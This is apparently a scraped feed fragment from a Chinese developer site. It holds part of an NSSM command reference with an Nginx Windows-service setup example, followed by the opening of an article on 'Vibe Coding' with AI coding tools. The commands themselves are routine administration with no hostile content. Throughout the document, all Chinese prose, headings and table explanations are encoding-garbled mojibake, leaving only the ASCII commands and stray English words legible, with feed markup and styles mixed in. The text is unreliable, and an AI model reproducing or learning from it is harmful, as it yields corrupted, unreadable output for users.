<table><thead><tr><th>å‘½ä»¤</th><th>è¯´æ˜</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td><code>nssm status &lt;servicename&gt;</code></td><td>æ£€æŸ¥æœåŠ¡çš„çŠ¶æ€ã€‚è¿”å›å¦‚Â <code>SERVICE_RUNNING</code>,Â <code>SERVICE_STOPPED</code>Â ç­‰ã€‚</td><td><code>nssm status MyService</code></td></tr><tr><td><code>nssm statuscode &lt;servicename&gt;</code></td><td>ä»¥æ•°å­—ä»£ç çš„å½¢å¼è¿”å›æœåŠ¡çš„çŠ¶æ€ã€‚</td><td><code>nssm statuscode MyService</code></td></tr><tr><td><code>nssm list</code></td><td>åˆ—å‡ºæ‰€æœ‰ç”± NSSM ç®¡ç†çš„æœåŠ¡ã€‚</td><td><code>nssm list</code></td></tr></tbody></table>
<h3 data-id="heading-8">4.5ã€é«˜çº§ä¸ä¸å¸¸ç”¨å‘½ä»¤</h3>






























<table><thead><tr><th>å‘½ä»¤</th><th>è¯´æ˜</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td><code>nssm dump &lt;servicename&gt;</code></td><td>ç”Ÿæˆä¸€ä¸ªåŒ…å«æœåŠ¡æ‰€æœ‰å½“å‰é…ç½®çš„å¯é‡å‘½åè„šæœ¬ã€‚ç”¨äºå¤‡ä»½æˆ–å¤åˆ¶é…ç½®ã€‚</td><td><code>nssm dump MyService &gt; config.txt</code></td></tr><tr><td><code>nssm rotatelogs &lt;servicename&gt;</code></td><td>æ‰‹åŠ¨è½®è½¬ï¼ˆå½’æ¡£ï¼‰è¯¥æœåŠ¡çš„è¾“å‡ºæ—¥å¿—æ–‡ä»¶ã€‚</td><td><code>nssm rotatelogs MyService</code></td></tr><tr><td><code>nssm process &lt;servicename&gt;</code></td><td>æ˜¾ç¤ºæ‰˜ç®¡è¯¥æœåŠ¡çš„ NSSM è¿›ç¨‹çš„ PIDã€‚</td><td><code>nssm process MyService</code></td></tr><tr><td><code>nssm processes</code></td><td>æ˜¾ç¤ºæ‰€æœ‰ NSSM æœåŠ¡è¿›ç¨‹çš„ PIDã€‚</td><td><code>nssm processes</code></td></tr></tbody></table>
<h3 data-id="heading-9">4.6ã€å¸¸ç”¨é…ç½®å‚æ•°ï¼ˆç”¨äºÂ <code>get</code>/<code>set</code>Â å‘½ä»¤ï¼‰</h3>
<p>å½“ä½¿ç”¨Â <code>nssm set &lt;servicename&gt; &lt;parameter&gt; &lt;value&gt;</code>Â æ—¶ï¼Œä»¥ä¸‹æ˜¯ä¸€äº›æœ€å¸¸ç”¨çš„Â <code>&lt;parameter&gt;</code>ï¼š</p>

































































<table><thead><tr><th>å‚æ•°</th><th>è¯´æ˜</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td><code>Application</code></td><td>è¦è¿è¡Œçš„å¯æ‰§è¡Œæ–‡ä»¶çš„å®Œæ•´è·¯å¾„ã€‚</td><td><code>nssm set MyService Application "C:\Program Files\nodejs\node.exe"</code></td></tr><tr><td><code>AppParameters</code></td><td>ä¼ é€’ç»™å¯æ‰§è¡Œæ–‡ä»¶çš„å‘½ä»¤è¡Œå‚æ•°ã€‚</td><td><code>nssm set MyService AppParameters "app.js"</code></td></tr><tr><td><code>AppDirectory</code></td><td>åº”ç”¨ç¨‹åºçš„å¯åŠ¨å·¥ä½œç›®å½•ã€‚</td><td><code>nssm set MyService AppDirectory "C:\MyApp"</code></td></tr><tr><td><code>AppStdout</code></td><td>é‡å®šå‘æ ‡å‡†è¾“å‡ºï¼ˆstdoutï¼‰çš„æ—¥å¿—æ–‡ä»¶è·¯å¾„ã€‚</td><td><code>nssm set MyService AppStdout "C:\logs\service.log"</code></td></tr><tr><td><code>AppStderr</code></td><td>é‡å®šå‘æ ‡å‡†é”™è¯¯ï¼ˆstderrï¼‰çš„æ—¥å¿—æ–‡ä»¶è·¯å¾„ã€‚</td><td><code>nssm set MyService AppStderr "C:\logs\error.log"</code></td></tr><tr><td><code>AppExit</code></td><td>æœåŠ¡é€€å‡ºè¡Œä¸ºã€‚é»˜è®¤ä¸ºÂ <code>Restart</code>ï¼Œé…åˆÂ <code>AppThrottle</code>Â ä½¿ç”¨ã€‚</td><td><code>nssm set MyService AppExit Default</code></td></tr><tr><td><code>AppThrottle</code></td><td>æœåŠ¡é‡å¯å‰çš„å»¶è¿Ÿæ—¶é—´ï¼ˆç§’ï¼‰ã€‚</td><td><code>nssm set MyService AppThrottle 5</code></td></tr><tr><td><code>DisplayName</code></td><td>åœ¨æœåŠ¡ç®¡ç†å™¨ä¸­æ˜¾ç¤ºçš„å‹å¥½åç§°ã€‚</td><td><code>nssm set MyService DisplayName "æˆ‘çš„é‡è¦æœåŠ¡"</code></td></tr><tr><td><code>Start</code></td><td>å¯åŠ¨ç±»å‹ã€‚<code>SERVICE_AUTO_START</code>(è‡ªåŠ¨),Â <code>SERVICE_DEMAND_START</code>(æ‰‹åŠ¨),Â <code>SERVICE_DISABLED</code>(ç¦ç”¨)ã€‚</td><td><code>nssm set MyService Start SERVICE_DEMAND_START</code></td></tr><tr><td><code>ObjectName</code></td><td>è¿è¡ŒæœåŠ¡æ‰€ç”¨çš„è´¦æˆ·ï¼ˆå¦‚Â <code>.\Administrator</code>Â æˆ–Â <code>NT AUTHORITY\SYSTEM</code>ï¼‰ã€‚</td><td><code>nssm set MyService ObjectName ".\MyUser"</code></td></tr><tr><td><code>Type</code></td><td>æœåŠ¡ç±»å‹ã€‚ç»å¤§å¤šæ•°æƒ…å†µä½¿ç”¨Â <code>SERVICE_WIN32_OWN_PROCESS</code>ã€‚</td><td><code>nssm set MyService Type SERVICE_WIN32_OWN_PROCESS</code></td></tr></tbody></table>
<h2 data-id="heading-10">äº”ã€æ¡ˆä¾‹:</h2>
<h3 data-id="heading-11">5.1ã€NginxæœåŠ¡</h3>
<h4 data-id="heading-12">5.1.1ã€ä½¿ç”¨ GUI ç•Œé¢å®‰è£…</h4>
<ol>
<li>
<p>å®‰è£…æœåŠ¡</p>
<pre><code class="hljs language-shell" lang="shell">nssm install Nginx
</code></pre>
</li>
<li>
<p>åœ¨å¼¹å‡ºçš„ GUI ç•Œé¢ä¸­é…ç½®ï¼š</p>
<p><strong>Application æ ‡ç­¾é¡µ</strong>ï¼š</p>
<ul>
<li><strong>Path</strong>:Â <code>D:\nginx\nginx.exe</code>Â ï¼ˆä½ çš„ nginx.exe å®Œæ•´è·¯å¾„ï¼‰</li>
<li><strong>Startup directory</strong>:Â <code>D:\nginx</code>Â ï¼ˆNginx å®‰è£…ç›®å½•ï¼‰</li>
<li><strong>Arguments</strong>: ï¼ˆç•™ç©ºï¼‰</li>
</ul>
<p><strong>Details æ ‡ç­¾é¡µ</strong>ï¼š</p>
<ul>
<li><strong>Display name</strong>:Â <code>Nginx Web Server</code>Â ï¼ˆå¯é€‰ï¼Œæ›´å‹å¥½çš„æ˜¾ç¤ºåç§°ï¼‰</li>
<li><strong>Startup type</strong>:Â <code>Automatic</code>Â ï¼ˆè®¾ç½®ä¸ºè‡ªåŠ¨å¯åŠ¨ï¼‰</li>
</ul>
<p><strong>I/O æ ‡ç­¾é¡µ</strong>ï¼š</p>
<ul>
<li><strong>Output (stdout)</strong> :Â <code>D:\nginx\logs\service-stdout.log</code></li>
<li><strong>Error (stderr)</strong> :Â <code>D:\nginx\logs\service-stderr.log</code><br/>
<em>è¿™ä¼šå°† Nginx çš„æ§åˆ¶å°è¾“å‡ºé‡å®šå‘åˆ°æ—¥å¿—æ–‡ä»¶</em></li>
</ul>
<p><strong>Exit æ ‡ç­¾é¡µ</strong>ï¼š</p>
<ul>
<li>å‹¾é€‰Â <code>Restart</code>Â é€‰é¡¹ï¼Œè®¾ç½®ï¼š
<ul>
<li><strong>Restart delay (ms)</strong> :Â <code>5000</code>Â ï¼ˆå¤±è´¥åç­‰å¾… 5 ç§’é‡å¯ï¼‰</li>
</ul>
</li>
</ul>
</li>
<li>
<p>ç‚¹å‡»Â <code>Install service</code>å®Œæˆå®‰è£…ã€‚</p>
</li>
</ol>
<h4 data-id="heading-13">5.1.2ã€å®Œå…¨ä½¿ç”¨å‘½ä»¤è¡Œå®‰è£…ï¼ˆé€‚åˆè„šæœ¬åŒ–éƒ¨ç½²ï¼‰</h4>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">å®‰è£…æœåŠ¡</span>
nssm install Nginx "D:\nginx\nginx.exe"
<span class="hljs-meta prompt_">
# </span><span class="bash">è®¾ç½®å¯åŠ¨ç›®å½•</span>
nssm set Nginx AppDirectory "D:\nginx"
<span class="hljs-meta prompt_">
# </span><span class="bash">è®¾ç½®æ˜¾ç¤ºåç§°</span>
nssm set Nginx DisplayName "Nginx Web Server"
<span class="hljs-meta prompt_">
# </span><span class="bash">è®¾ç½®å¯åŠ¨ç±»å‹ä¸ºè‡ªåŠ¨</span>
nssm set Nginx Start SERVICE_AUTO_START
<span class="hljs-meta prompt_">
# </span><span class="bash">é…ç½®æ—¥å¿—é‡å®šå‘</span>
nssm set Nginx AppStdout "D:\nginx\logs\service-stdout.log"
nssm set Nginx AppStderr "D:\nginx\logs\service-stderr.log"
<span class="hljs-meta prompt_">
# </span><span class="bash">é…ç½®å¤±è´¥æ—¶è‡ªåŠ¨é‡å¯</span>
nssm set Nginx AppExit Default Restart
nssm set Nginx AppRestartDelay 5000
<span class="hljs-meta prompt_">
# </span><span class="bash">å¯åŠ¨æœåŠ¡</span>
nssm start Nginx
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vibe Coding å®æˆ˜æŒ‡å—ï¼šä»â€œæ‰‹å†™ä»£ç â€åˆ°â€œæ„å›¾è®¾è®¡â€çš„å‰ç«¯èŒƒå¼è½¬ç§»]]></title>    <link>https://juejin.cn/post/7576052677050925082</link>    <guid>https://juejin.cn/post/7576052677050925082</guid>    <pubDate>2025-11-24T08:45:17.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576052677050925082" data-draft-id="7575829296452829194" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vibe Coding å®æˆ˜æŒ‡å—ï¼šä»â€œæ‰‹å†™ä»£ç â€åˆ°â€œæ„å›¾è®¾è®¡â€çš„å‰ç«¯èŒƒå¼è½¬ç§»"/> <meta itemprop="keywords" content="å‰ç«¯,AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2025-11-24T08:45:17.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æƒ³è¿›å­—èŠ‚å†²å•Šå†²"/> <meta itemprop="url" content="https://juejin.cn/user/2947168673222887"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vibe Coding å®æˆ˜æŒ‡å—ï¼šä»â€œæ‰‹å†™ä»£ç â€åˆ°â€œæ„å›¾è®¾è®¡â€çš„å‰ç«¯èŒƒå¼è½¬ç§»
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2947168673222887/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æƒ³è¿›å­—èŠ‚å†²å•Šå†²
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T08:45:17.000Z" title="Mon Nov 24 2025 08:45:17 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    19
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. å¼•è¨€ï¼šé›¶ç¼–ç å®ç°çš„åˆä½“éªŒ</h2>
<p>æœ€è¿‘åœ¨å¼€å‘éœ€æ±‚æ—¶ï¼Œé¢‘ç¹å¬åˆ°å…³äº AI ç¼–ç¨‹èƒ½åŠ›çš„è®¨è®ºã€‚å€Ÿç€ Qoder æµ‹è¯•ç‰ˆå‘å¸ƒçš„å¥‘æœºï¼Œæˆ‘å†³å®šåœ¨å®é™…ä¸šåŠ¡ä¸­ä½“éªŒä¸€æŠŠâ€œé›¶ç¼–ç â€å¼€å‘ã€‚</p>
<p>è¿™æ¬¡å®éªŒä¸ä»…æ˜¯ä¸€æ¬¡å·¥å…·çš„è¯•ç”¨ï¼Œæ›´æ˜¯ä¸€æ¬¡å¼€å‘æ¨¡å¼çš„<strong>èŒƒå¼è½¬ç§»</strong>ã€‚æˆ‘å‘ç°ï¼Œåœ¨ AI è¾…åŠ©ä¸‹ï¼Œå‰ç«¯å·¥ç¨‹å¸ˆçš„è§’è‰²æ­£åœ¨å‘ç”Ÿæœ¬è´¨å˜åŒ–ï¼šæˆ‘ä»¬ä¸å†ä»…ä»…æ˜¯ä»£ç çš„ç¼–å†™è€…ï¼ˆCoderï¼‰ï¼Œè€Œæ˜¯è½¬å˜ä¸º**æ¶æ„å¸ˆ + äº§å“ç»ç† + è´¨é‡ä¿éšœï¼ˆQAï¼‰**çš„å¤åˆä½“ã€‚è¿™æ­£æ˜¯ Andrej Karpathy æ‰€æå‡ºçš„ <strong>"Vibe Coding"ï¼ˆæ°›å›´ç¼–ç /ç›´è§‰ç¼–ç ï¼‰</strong> â€”â€”ä½ è´Ÿè´£æŠŠæ¡é€»è¾‘ä¸æ•ˆæœï¼ˆThe Vibeï¼‰ï¼ŒAI è´Ÿè´£å…·ä½“çš„è¯­æ³•å®ç°ï¼ˆThe Codeï¼‰ã€‚</p>
<h2 data-id="heading-1">2. å®æˆ˜å¤ç›˜ï¼šçº§è”å¤šé€‰ç»„ä»¶çš„â€œæ— ä¸­ç”Ÿæœ‰â€</h2>
<h3 data-id="heading-2">2.1 éœ€æ±‚èƒŒæ™¯ä¸æŒ‘æˆ˜</h3>
<p>ä¸šåŠ¡åœºæ™¯éœ€è¦ä¸€ä¸ªæ”¯æŒ<strong>å¤šé€‰</strong>çš„çº§è”é€‰æ‹©å™¨ï¼ˆçœ-å¸‚-åŒº-ç¤¾åŒºï¼‰ï¼Œä¸”äº¤äº’é€»è¾‘å¤æ‚ï¼š</p>
<ul>
<li>çœå¸‚å±‚çº§å•é€‰ï¼ŒåŒºä¸ç¤¾åŒºå±‚çº§å¤šé€‰ã€‚</li>
<li>å•é€‰ä¸å¤šé€‰é€»è¾‘æ··åˆã€‚</li>
<li><strong>æŠ€æœ¯éš¾ç‚¹</strong>ï¼šé¡¹ç›®ä½¿ç”¨çš„ Vant UI ç»„ä»¶åº“ä¸­çš„ <code>Cascader</code> ç»„ä»¶åŸç”Ÿä»…æ”¯æŒå•é€‰ã€‚</li>
</ul>
<h3 data-id="heading-3">2.2 åˆå§‹æ²Ÿé€šï¼šç²—ç³™ä½†æœ‰æ•ˆçš„æ„å›¾ä¼ è¾¾</h3>
<p>è¿™æ˜¯æˆ‘ç¬¬ä¸€æ¬¡å®Œå…¨ä¾èµ– AI ç¼–ç¨‹ã€‚æˆ‘çš„ç¬¬ä¸€ç‰ˆ Prompt éå¸¸ç›´ç™½ï¼Œç”šè‡³æœ‰äº›ç²—ç³™ï¼Œç›´æ¥æŠŠéœ€æ±‚å’Œè®¾è®¡ç¨¿ä¸¢ç»™äº† AIï¼š</p>
<p><strong>User Prompt:</strong><br/>
ä½ çŸ¥é“ vant ä¸­çš„ Cascader å—ï¼Ÿç»„ä»¶åªèƒ½æ”¯æŒå•é€‰ï¼Œæˆ‘å¸Œæœ›å®ƒæ”¯æŒå¤šé€‰ã€‚<br/>
è¯·æŠŠè¿™é‡Œçš„ Cascader æ›¿æ¢ä¸ºå¤šé€‰ç»„ä»¶ã€‚<br/>
æˆ‘å¯ä»¥ç»™ä½ æä¾›å¯ä¾›å‚è€ƒçš„ UI è®¾è®¡ç¨¿ï¼Œä½ æœ‰ä¸æ‡‚çš„å¯ä»¥éšæ—¶é—®æˆ‘ã€‚<br/>
é™„ä»¶ï¼šuiç¨¿ä½ç½®@index.md</p>
<h3 data-id="heading-4">2.3 AI çš„æƒŠäººåé¦ˆï¼šä¸ä»…ä»…æ˜¯ä»£ç </h3>
<p>è®©æˆ‘æƒŠè®¶çš„æ˜¯ï¼ŒClaude å¹¶æ²¡æœ‰ç›´æ¥æ‰”ç»™æˆ‘ä¸€å †ä»£ç ï¼Œè€Œæ˜¯å…ˆç”Ÿæˆäº†ä¸€ä»½**ã€Šçº§è”å¤šé€‰ç»„ä»¶è®¾è®¡æ–‡æ¡£ã€‹**ã€‚</p>
<p>è¿™ä»½æ–‡æ¡£åŒ…å«äº†ï¼š</p>
<ol>
<li><strong>æŠ€æœ¯æ¶æ„</strong>ï¼šä½¿ç”¨ Mermaid ç»˜åˆ¶çš„ç»„ä»¶å±‚æ¬¡ç»“æ„å›¾ã€‚</li>
<li><strong>æ•°æ®æµå‘</strong>ï¼šæ¸…æ™°çš„ <code>Props</code> å’Œ <code>Emit</code> æ¥å£å®šä¹‰ã€‚</li>
<li><strong>é€»è¾‘è¾¹ç•Œ</strong>ï¼šè¯¦ç»†æè¿°äº†â€œå‘ä¸‹çº§è”å…¨é€‰â€å’Œâ€œå‘ä¸Šçº§è”åé€‰â€çš„é€»è¾‘ã€‚</li>
</ol>
<p><strong>ğŸ’¡</strong> <strong>æ´å¯Ÿ</strong>ï¼šAI ç”Ÿæˆçš„è®¾è®¡æ–‡æ¡£è™½ç„¶å®Œç¾ï¼Œä½†å®é™…ç”Ÿæˆçš„ä»£ç ï¼ˆMVPç‰ˆæœ¬ï¼‰å´å­˜åœ¨æ•°æ®åŠ è½½å¤±è´¥ã€Tab æ— æ³•åˆ‡æ¢ç­‰ Bugã€‚è¿™æ­ç¤ºäº† Vibe Coding çš„æ ¸å¿ƒç—›ç‚¹ï¼š<strong>å®è§‚è®¾è®¡å®Œç¾ï¼Œå¾®è§‚å®ç°æ˜“é”™ã€‚</strong></p>
<h2 data-id="heading-5">3. æ ¸å¿ƒæ–¹æ³•è®ºï¼šå¦‚ä½•è®© AI è¯»æ‡‚ä½ çš„â€œæ„å›¾â€</h2>
<p>åœ¨ç»å†äº†åå‡ è½®çš„ä¿®å¤å’Œè¿­ä»£åï¼Œæˆ‘æ€»ç»“å‡ºäº†é©¾é©­ AI çš„ä¸‰æ¿æ–§ã€‚</p>
<h3 data-id="heading-6">3.1 æ„å›¾å®šä¹‰ï¼ˆDefine the Vibeï¼‰</h3>
<p>æ”¾å¼ƒæ€è€ƒ DOM ç»“æ„ï¼Œè·³å‡ºä¼ ç»Ÿçš„â€œå®ç°ç»†èŠ‚â€ï¼Œè½¬è€Œæè¿°â€œåŠŸèƒ½ä¸äº¤äº’â€ã€‚</p>
<ul>
<li>âŒ <strong>Bad Vibe</strong>: "å†™ä¸€ä¸ªçº¢è‰²çš„æŒ‰é’®ã€‚"</li>
<li>âœ… <strong>Good Vibe</strong>: "åˆ›å»ºä¸€ä¸ªä¸»æ“ä½œæŒ‰é’®ï¼Œå½“é¼ æ ‡ Hover æ—¶æœ‰å¾®å°çš„ç¼©æ”¾åŠ¨ç”»ï¼Œç‚¹å‡»æ—¶æ˜¾ç¤º Loading çŠ¶æ€ï¼Œå¹¶ä¸”è¦ç¬¦åˆæˆ‘ä»¬ç°æœ‰çš„ç´«è‰²å“ç‰Œè‰²è°ƒã€‚"</li>
</ul>
<h3 data-id="heading-7">3.2 è§„åˆ™çº¦æŸï¼ˆContext &amp; Rulesï¼‰</h3>
<p>AI å°±åƒä¸€ä¸ªæ‰åæ¨ªæº¢ä½†ä¸å—çº¦æŸçš„å®ä¹ ç”Ÿã€‚å¦‚æœä¸ç«‹è§„çŸ©ï¼Œå®ƒä¼šå†™å‡ºé£æ ¼è¿¥å¼‚çš„ä»£ç ã€‚æˆ‘ä»¬éœ€è¦é€šè¿‡ <code>.cursorrules</code> æˆ–ç³»ç»Ÿæç¤ºè¯æ¥çº¦æŸå®ƒã€‚</p>
<p><strong>å®æˆ˜ç»éªŒï¼š</strong> æˆ‘å°†å›¢é˜Ÿçš„ ESLint è§„åˆ™ã€TypeScript è§„èŒƒä»¥åŠ React/Vue çš„æœ€ä½³å®è·µæ•´ç†ç»™ AIã€‚ä¾‹å¦‚ï¼š</p>
<ul>
<li><strong>å˜é‡å‘½å</strong>ï¼šå¿…é¡»ä½¿ç”¨ <code>const</code>ï¼Œå˜é‡åè¦è¯­ä¹‰åŒ–ã€‚</li>
<li><strong>ç±»å‹å®‰å…¨</strong>ï¼šç¦æ­¢ä½¿ç”¨ <code>any</code>ï¼Œä¼˜å…ˆä½¿ç”¨ <code>interface</code> è€Œé <code>type</code>ã€‚</li>
<li><strong>æ ·å¼ç®¡ç†</strong>ï¼šæ˜ç¡®æŒ‡å®šä½¿ç”¨ Tailwind CSS è¿˜æ˜¯ styled-componentsï¼Œé˜²æ­¢ AI æ··ç”¨ã€‚</li>
</ul>
<p><em>(æ³¨ï¼šåœ¨å®é™…æ“ä½œä¸­ï¼Œå»ºè®®å»ºç«‹é¡¹ç›®çº§çš„</em> <code>.cursorrules</code> <em>æ–‡ä»¶ï¼Œå°†ç¼–ç è§„èŒƒå›ºåŒ–ä¸‹æ¥ï¼ŒAI ä¼šè‡ªåŠ¨è¯»å–ã€‚)</em></p>
<h3 data-id="heading-8">3.3 å¾®è°ƒä¸è¿­ä»£ï¼ˆReview &amp; Refineï¼‰</h3>
<p>AI ç”Ÿæˆçš„ä»£ç å¾€å¾€ä¸èƒ½ç›´æ¥ä¸Šçº¿ï¼Œè¿™æ—¶éœ€è¦è¿›è¡Œ<strong>å¾®è°ƒ</strong>ã€‚</p>
<ul>
<li><strong>ç²¾ç¡®ä¸Šä¸‹æ–‡</strong>ï¼šä¸è¦è®© AI ç›²ç›®é‡å†™ã€‚é€‰ä¸­å…·ä½“çš„ä»£ç è¡Œï¼Œå‘Šè¯‰å®ƒï¼šâ€œåªä¿®æ”¹è¿™ä¸ªå‡½æ•°çš„é”™è¯¯å¤„ç†é€»è¾‘â€ã€‚</li>
<li><strong>æµ‹è¯•é©±åŠ¨</strong>ï¼šè®© AI è‡ªå·±ç”Ÿæˆæµ‹è¯•ç”¨ä¾‹å’Œæµ‹è¯•é¡µé¢ã€‚æˆ‘å»æµ‹è¯•é¡µé¢æ“ä½œï¼Œå‘ç° Bug åï¼Œå°†ç°è±¡æè¿°ç»™ AIï¼Œè®©å®ƒè‡ªæˆ‘ä¿®å¤ã€‚</li>
</ul>
<h2 data-id="heading-9">4. é¿å‘æŒ‡å—ä¸æœ€ä½³å®è·µ</h2>
<h3 data-id="heading-10">4.1 è­¦æƒ•â€œå¹»è§‰â€ä¸æ ·å¼å´©å</h3>
<ul>
<li><strong>ç°è±¡</strong>ï¼šAI å¯èƒ½ä¼šç¼–é€ ä¸å­˜åœ¨çš„ Tailwind ç±»åï¼Œæˆ–è€…ä½¿ç”¨äº†é¡¹ç›®æœªå®‰è£…çš„å›¾æ ‡åº“ã€‚</li>
<li><strong>å¯¹ç­–</strong>ï¼šåœ¨ Rules ä¸­æ˜ç¡®ç™½åå•ã€‚ä¾‹å¦‚ï¼šâ€œå›¾æ ‡åº“è¯·ä»…ä½¿ç”¨ <code>Lucide-React</code>ï¼Œä¸è¦å¼•å…¥å…¶ä»–åº“ã€‚â€</li>
</ul>
<h3 data-id="heading-11">4.2 ä¿æŒä»£ç ä¸€è‡´æ€§</h3>
<ul>
<li><strong>ç°è±¡</strong>ï¼šåŒä¸€ä¸ªç»„ä»¶ï¼ŒAI ä¸€ä¼šå„¿ç”¨ <code>function</code> å®šä¹‰ï¼Œä¸€ä¼šå„¿ç”¨ç®­å¤´å‡½æ•°ã€‚</li>
